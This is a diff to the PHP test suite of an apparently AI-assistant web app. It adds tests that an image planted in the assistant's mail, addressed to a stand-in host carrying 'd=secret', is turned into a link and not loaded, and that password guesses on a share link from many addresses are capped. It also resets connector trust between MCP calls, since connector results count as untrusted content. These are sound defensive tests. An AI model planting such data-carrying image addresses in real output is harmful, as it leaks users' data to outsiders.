@@ -709,6 +709,9 @@ check('mail template: a card with the title once, the space, a button to the app
 check('mail template: headings, nested lists, tables and tasks get inline styles', str_contains($page, '<h3 style="') && preg_match('#<li style="[^"]*">.*<ul style="#s', $page) && str_contains($page, '<table style="')
     && str_contains($page, '<th style="') && str_contains($page, 'text-align:right"') && str_contains($page, '☑ done') && str_contains($page, '<em style') === false && str_contains($page, '<em>b</em>'));
 check('mail template: escaped, relative links made absolute, unsafe ones dropped', str_contains($page, 'Hi &lt;b&gt;') && str_contains($page, 'href="https://a.example/fred/#library/4"') && !str_contains($page, 'javascript:'));
+// a mail app loads the images of a mail when it is opened: a planted image address would report it and carry data (1.41.4)
+$imgMail = \Talixio\MailTemplate::page("Report\n\n![chart](https://evil.example/p.png?d=secret)", ['title' => 'R']);
+check('mail template: the assistant\'s mail loads no image from outside, it links to it', !str_contains($imgMail, '<img') && str_contains($imgMail, 'href="https://evil.example/p.png?d=secret"') && str_contains($imgMail, '>chart</a>'), $imgMail);
 check('mail template: relative links without a known address are not links', !str_contains(\Talixio\MailTemplate::plain('[n](#library/4)'), 'href') && str_contains(\Talixio\MailTemplate::plain('[n](#library/4)'), '>n</a>'));
 check('mail template: a link with no address to resolve it is emptied', \Talixio\MailTemplate::link('#library/4', '') === '' && \Talixio\MailTemplate::link('/fred/x', 'https://a.example/fred') === 'https://a.example/fred/x'
     && \Talixio\MailTemplate::link('https://x.io', '') === 'https://x.io');
@@ -2175,6 +2178,13 @@ $prow = $la->store->q('SELECT * FROM shares WHERE id = ?', [$pw['id']])->fetch()
 $_SERVER['REMOTE_ADDR'] = '203.0.113.9';
 for ($i = 0; $i < 10; $i++) $shs->unlock($prow, 'wrong');
 check('shares: password tries are limited', (function () use ($shs, $prow) { try { $shs->unlock($prow, 'abcd'); return false; } catch (\RuntimeException $e) { return str_contains($e->getMessage(), 'Too many'); } })());
+// many addresses, a few tries each: the link itself has a cap too (1.41.4); setcookie cannot run here, so a right try is not made
+$pw2 = $shs->create(['file' => $idTxt], ['password' => 'abcd']);
+$prow2 = $la->store->q('SELECT * FROM shares WHERE id = ?', [$pw2['id']])->fetch();
+$refused = 0;
+for ($ip = 1; $ip <= 10; $ip++) { $_SERVER['REMOTE_ADDR'] = "198.51.100.$ip"; for ($i = 0; $i < 9; $i++) { try { $shs->unlock($prow2, 'wrong'); } catch (\RuntimeException) { $refused++; } } }
+check('shares: wrong passwords from many addresses are limited per link too', $refused >= 60, "refused $refused of 90");
+$shs->revoke($pw2['id']); $_SERVER['REMOTE_ADDR'] = '203.0.113.9';
 check('shares: too short a password is refused', (function () use ($shs, $idTxt) { try { $shs->create(['file' => $idTxt], ['password' => 'ab']); return false; } catch (\InvalidArgumentException) { return true; } })());
 check('shares: the assistant needs the user\'s approval to share', $la->tools->needsApproval('share_create') && !$la->tools->needsApproval('share_list') && !$la->tools->needsApproval('share_revoke'));
 $shs->revoke($pw['id']);
@@ -3054,13 +3064,19 @@ if (\Talixio\Shell::binary()) {
     unlink("$md/secret.txt");
 }
 check('mcp: local call with its environment', $ma->tools->run('mcp_local_fake_lookup', ['word' => 'zebra']) === 'definition of zebra (tok-1)');
+// each call below starts a new answer: a connector's result is content written by others, and since 1.41.4 the tools of a
+// connector trusted for everything ask after it in the same answer (checked in tests/more/untrusted.php)
+\Talixio\Privacy::trustAgain();
 check('mcp: remote call with session and headers (SSE answer)', $ma->tools->run('mcp_remote_lookup', ['word' => 'okapi']) === 'definition of okapi (Bearer xyz)');
+\Talixio\Privacy::trustAgain();
 $r = $ma->tools->run('mcp_local_fake_create_note', ['text' => 'buy milk']);
 check('mcp: tools that change something wait for approval', str_contains($r, 'Waiting for the user\'s approval') && str_contains($ma->approvals()->pending()[0]['summary'] ?? '', 'create_note'), $r);
 $ma->cfg->notify = [];
 $done = $ma->approvals()->decide((int)$ma->approvals()->pending()[0]['id'], true);
 check('mcp: approved call runs', str_contains($done, 'note created: buy milk'), $done);
+\Talixio\Privacy::trustAgain();
 check('mcp: trusted server runs without asking', $ma->tools->run('mcp_remote_create_note', ['text' => 'x']) === 'note created: x');
+\Talixio\Privacy::trustAgain();
 check('mcp: tool errors reported as errors', str_starts_with($ma->tools->run('mcp_remote_fail', []), 'error: it broke'));
 $job = $ma->tools->only('job')->names();
 check('mcp: background jobs get read-only connector tools only', in_array('mcp_local_fake_lookup', $job, true) && !in_array('mcp_local_fake_create_note', $job, true));
